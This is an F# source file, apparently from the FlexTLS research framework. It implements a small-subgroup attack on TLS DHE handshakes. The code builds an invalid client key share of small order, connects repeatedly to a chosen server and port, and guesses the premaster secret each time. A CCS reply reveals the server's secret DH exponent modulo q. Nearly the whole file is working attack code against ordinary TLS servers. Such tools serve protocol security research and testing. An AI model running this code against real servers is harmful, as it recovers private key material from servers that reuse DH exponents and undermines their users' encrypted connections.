﻿#light "off"

module FlexApps.Attack_SmallSubgroup_DHE

open Bytes
open Error
open TLSInfo
open TLSConstants

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexServerKeyExchange
open FlexCertificateRequest
open FlexCertificateVerify
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets

open Org.BouncyCastle.Math
open Org.BouncyCastle.Security


type Attack_SmallSubgroup_DHE =
    class

    /// <summary>    
    /// Runs a DHE handshake with an invalid ephemeral public key from a (small) subgroup    
    /// </summary>
    /// <remarks>
    /// Learns y mod q where y is the server secret DH exponent (only useful if the server reuses y)
    /// </remarks>
    /// <param name="check"> Check that server p is as expected and warn if gy changes </param>
    /// <param name="retries"> Number of retries before giving up </param>
    /// <param name="ps"> Diffie-Hellman parameter p </param>
    /// <param name="qs"> Small subgroup order (normally, a factor of p-1) </param>
    /// <param name="server_name"> Hostname to connect to </param>
    /// <param name="port"> Port to connect to </param>
    /// <returns> Updated state </returns>   
    static member run (check:bool, retries:int, ps:string, qs:string, server_name:string, ?port:int) : unit =        
        let port = defaultArg port FlexConstants.defaultTCPPort in
        let p = BigInteger(ps) in
        let q = BigInteger(qs) in

        // Pick a generator g of a subgroup of order q
        let gen = new SecureRandom() in      
        let h   = new BigInteger(p.BitLength, gen) in
        let pm1 = p.Subtract(BigInteger.One) in
        let g   = h.ModPow(pm1.Divide(q), p) in        
        
        // Check order of g is really q
        assert(g.ModPow(q, p).Equals(BigInteger.One));

        // Choose a share gx from the small subgroup of order q generated by g
        let x  = new BigInteger(q.BitLength, gen) in
        let gx = g.ModPow(x, p) in
      
        // Check order of gx is really q  
        assert(gx.ModPow(q, p).Equals(BigInteger.One));        

        // Ensure we use DHE
        let fch = {FlexConstants.nullFClientHello with
            ciphersuites = Some([TLS_DHE_RSA_WITH_AES_128_CBC_SHA]) } in        
        
        let pms = ref gx in
        let gy  = ref (abytes (p.ToByteArrayUnsigned())) in
          
        // Try iteratively pms = gx, gx^2, ... until we hit the correct one
        // (just one modular multiplication per try)
        for z in 1 .. retries do 
            // Run a normal DHE handshake until ServerHelloDone is received
            let st,_ = FlexConnection.clientOpenTcpConnection(server_name,server_name,port) in                       
            let st,nsc,fch   = FlexClientHello.send(st,fch) in
            let st,nsc,fsh   = FlexServerHello.receive(st,fch,nsc) in
            let st,nsc,fcert = FlexCertificate.receive(st,Client,nsc) in
            let st,nsc,fske  = FlexServerKeyExchange.receiveDHE(st,nsc) in
            let st,fshd      = FlexServerHelloDone.receive(st) in
            
            let kexdh =
                match nsc.keys.kex with
                | DH(kexdh) -> kexdh
                | _         -> failwith (perror __SOURCE_FILE__ __LINE__  "key exchange mechanism should be DHE")
            in

            // Check that we received the expected p          
            if (check) then              
                begin
                    let pbytes, _ = kexdh.pg in
                    assert (p.Equals(BigInteger(1, cbytes pbytes)));
                    if (1 < z && not (kexdh.gy.Equals(!gy))) then
                        begin
                            printfn "Warning: server share changed!"
                        end;
                    gy := kexdh.gy;
                end;     
            
            // Send the precomputed share gx
            let kexdh = { kexdh with x  = abytes (x.ToByteArrayUnsigned()); 
                                     gx = abytes (gx.ToByteArrayUnsigned()) } in
            let fcke     = FlexClientKeyExchange.prepareDHE(kexdh)  in
            let st, fcke = FlexClientKeyExchange.sendDHE(st, kexdh) in

            // Guess the pms; if correct, we learn y mod q
            // This is because with overwhelming probability we have
            // pms = gx^z = g^(x*z) = g^(x*y) => x*z = x*y mod q -> y = z mod q
            let guess = abytes ((!pms).ToByteArrayUnsigned()) in            
            let epk = { nsc.keys with kex = fcke.kex; pms = guess } in
            let nsc = { nsc with keys = epk } in
            let nsc = FlexSecrets.fillSecrets(st,Client,nsc) in

            let st,_         = FlexCCS.send(st) in

            // Start encrypting
            let st           = FlexState.installWriteKeys st nsc in
        
            // Send encrypted Finished message, if the server answers with a CCS message, our pms guess 
            // is correct with overwhelming probability
            let st,ffC       = FlexFinished.send(st,nsc,Client) in
            try 
                let st,_,_   = FlexCCS.receive(st) in
                printfn "y == %4d mod %s" z (q.ToString());
                exit(0)
            with 
                _ -> 
                    printfn "y <> %4d mod %s" z (q.ToString());
                    // Next guess
                    pms := (!pms).Multiply(gx).Mod(p);
       done 

    end
